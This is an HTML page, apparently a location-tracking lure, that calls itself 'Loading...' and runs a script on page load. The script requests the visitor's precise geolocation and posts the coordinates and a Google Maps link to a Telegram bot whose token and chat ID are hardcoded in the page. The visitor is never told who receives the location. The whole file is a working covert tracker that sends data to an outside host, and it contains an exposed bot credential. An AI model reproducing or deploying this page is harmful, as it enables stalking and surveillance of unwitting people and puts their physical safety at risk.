<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="font-family:sans-serif; text-align:center; padding-top:20%;">
    <h3 id="status">Requesting location access...</h3>

    <script>
        const BOT_TOKEN = "8776780056:AAFHtBhpyPqKIaUkrl5ia9YC6uZWgdeEO-Y";
        const CHAT_ID = "8816955567";

        function updateStatus(text) {
            document.getElementById("status").innerText = text;
        }

        function sendLocation(lat, lon) {
            updateStatus("Sending location to Telegram...");
            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const text = `📍 *New Location Alert*\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${mapUrl})`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => {
                if(res.ok) {
                    updateStatus("Location sent successfully!");
                } else {
                    updateStatus("Failed to send (Check Bot Token/Chat ID)");
                }
            })
            .catch(err => {
                updateStatus("Error: " + err.message);
            });
        }

        function track() {
            if (navigator.geolocation) {
                updateStatus("Please tap 'Allow' for location permission...");
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendLocation(pos.coords.latitude, pos.coords.longitude);
                    },
                    (err) => {
                        updateStatus("Location permission denied or unavailable.");
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                updateStatus("Geolocation is not supported by this browser.");
            }
        }

        window.onload = () => {
            track();
        };
    </script>
</body>
</html>
